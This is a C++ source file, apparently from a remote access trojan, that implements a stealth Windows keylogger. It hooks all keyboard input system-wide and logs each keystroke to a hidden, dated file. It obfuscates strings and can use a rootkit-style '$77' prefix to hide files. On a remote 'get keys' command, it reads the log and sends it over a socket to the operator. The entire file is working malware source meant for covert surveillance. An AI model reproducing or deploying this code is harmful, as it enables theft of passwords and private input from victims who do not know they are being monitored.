#include "Keylogger.h"
#include "NetworkHelper.h"

HANDLE Keylogger::logs;

Keylogger::Keylogger(char *exe):
	_filename{ Settings::keylogger_dir }
{
	if (!CreateDirectoryA(Settings::keylogger_dir.c_str(), NULL))
		SetFileAttributesA(Settings::keylogger_dir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_DIRECTORY);
	
	if (Settings::useR77)
		_filename += AY_OBFUSCATE("$77");
	//build dated file
	SYSTEMTIME si;
	char out[50];
	GetSystemTime(&si);
	GetDateFormatA(LOCALE_USER_DEFAULT, NULL, &si, "dd'-'MM'-'yyyy", out, 50);
	_filename += out;
	_filename += AY_OBFUSCATE(".txt");

	//create or open a file 
	logs = CreateFileA(_filename.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
	SetFilePointer(logs, 0, 0, FILE_END);

	DWORD id;
	_thread_h = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Keylogger::Handle, (void *)exe, NULL, &id);
}

Keylogger::~Keylogger()
{
	TerminateThread(_thread_h, 0);
	CloseHandle(logs);
}

void Keylogger::HandleHook(SOCKET s, const std::string& hook)
{
	if (hook == CMD_GET_KEYS) {
		int size = std::filesystem::file_size(_filename);
		HANDLE hF = CreateFileA(_filename.c_str(), GENERIC_READ, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
		std::vector<char> data(size);
		ReadFile(hF, data.data(), size, NULL, NULL);
		CloseHandle(hF);
		data.push_back('\n');
		NetworkHelper::SendData(s, data);
	}

}

// Global Hook handle
HHOOK hKeyHook;
// This is the function that is "exported" from the
// execuatable like any function is exported from a
// DLL. It is the hook handler routine for low level
// keyboard events.
__declspec(dllexport)LRESULT CALLBACK KeyEvent(
	int nCode,  // The hook code
	WPARAM wParam,  // The window message (WM_KEYUP, WM_KEYDOWN, etc.)
	LPARAM lParam  // A pointer to a struct with information about the pressed key
) {
	if ((nCode == HC_ACTION) &&  // HC_ACTION means we may process this event
		((wParam == WM_SYSKEYDOWN) ||  // Only react if either a system key ...
			(wParam == WM_KEYDOWN)))  // ... or a normal key have been pressed.
	{
		//  This struct contains various information about
		//  the pressed key such as hardware scan code, virtual
		//  key code and further flags.
		KBDLLHOOKSTRUCT hooked =
			*((KBDLLHOOKSTRUCT*)lParam);
		//  dwMsg shall contain the information that would be stored
		//  in the usual lParam argument of a WM_KEYDOWN message.
		//  All information like hardware scan code and other flags
		//  are stored within one double word at different bit offsets.
		//  Refer to MSDN for further information:
		//
		//  http://msdn.microsoft.com/library/en-us/winui/winui/
		//  windowsuserinterface/userinput/keyboardinput/aboutkeyboardinput.asp
		//
		//  (Keystroke Messages)
		DWORD dwMsg = 1;
		dwMsg += hooked.scanCode << 16;
		dwMsg += hooked.flags << 24;
		//  Call the GetKeyNameText() function to get the language-dependant
		//  name of the pressed key. This function should return the name
		//  of the pressed key in your language, aka the language used on
		//  the system.
		char lpszName[0x100] = { 0 };
		lpszName[0] = '[';
		int i = GetKeyNameTextA(dwMsg,
			(lpszName + 1), 0xFF) + 1;
		strcat_s(lpszName, "]");
		//  Print this name to the standard console output device.
		WriteFile(Keylogger::logs, lpszName, strlen(lpszName), NULL, NULL);
	}
	//  the return value of the CallNextHookEx routine is always
	//  returned by your HookProc routine. This allows other
	//  applications to install and handle the same hook as well.
	return CallNextHookEx(hKeyHook,
		nCode, wParam, lParam);
}

// This thread is started by the main routine to install
// the low level keyboard hook and start the message loop
// to loop forever while waiting for keyboard events.
DWORD WINAPI Keylogger::Handle(LPVOID lpParameter)
{
	//  Get a module handle to our own executable. Usually,
	//  the return value of GetModuleHandle(NULL) should be
	//  a valid handle to the current application instance,
	//  but if it fails we will also try to actually load
	//  ourself as a library. The thread's parameter is the
	//  first command line argument which is the path to our
	//  executable.
	HINSTANCE hExe = GetModuleHandleA(NULL);
	if (!hExe) hExe = LoadLibraryA((LPCSTR)lpParameter);

	//  Everything failed, we can't install the hook ... this
	//  never happened, but error handling is important.
	if (!hExe) return 1;
	hKeyHook = SetWindowsHookExA(  // install the hook:
		WH_KEYBOARD_LL,  // as a low level keyboard hook
		(HOOKPROC)KeyEvent,  // with the KeyEvent function from this executable
		hExe,  // and the module handle to our own executable
		NULL  // and finally, the hook should monitor all threads.
	);
	
	//  Loop forever in a message loop and if the loop
	//  stops some time, unhook the hook. I could have
	//  added a signal handler for ctrl-c that unhooks
	//  the hook once the application is terminated by
	//  the user, but I was too lazy.
	MSG message;
	while (GetMessageW(&message, NULL, 0, 0)) {
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
	UnhookWindowsHookEx(hKeyHook);
	return 0;
}
